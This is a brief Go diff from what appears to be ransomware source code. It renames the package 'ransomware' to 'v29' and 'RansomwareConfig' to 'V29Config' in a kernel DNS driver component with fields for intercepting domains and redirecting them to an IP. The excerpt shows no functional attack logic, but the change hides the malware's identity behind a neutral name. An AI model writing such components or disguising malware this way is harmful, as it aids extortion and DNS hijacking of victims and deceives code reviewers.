@@ -1,4 +1,4 @@
-package ransomware
+package v29
 
 import (
 	"fmt"
@@ -11,7 +11,7 @@ import (
 )
 
 type KernelDNSDriver struct {
-	config         *RansomwareConfig
+	config         *V29Config
 	driverPath     string
 	driverLoaded   bool
 	filterHandles  []string
@@ -20,7 +20,7 @@ type KernelDNSDriver struct {
 	redirectIP     string
 }
 
-func NewKernelDNSDriver(cfg *RansomwareConfig) *KernelDNSDriver {
+func NewKernelDNSDriver(cfg *V29Config) *KernelDNSDriver {
 	return &KernelDNSDriver{
 		config: cfg,
 		interceptDomains: []string{
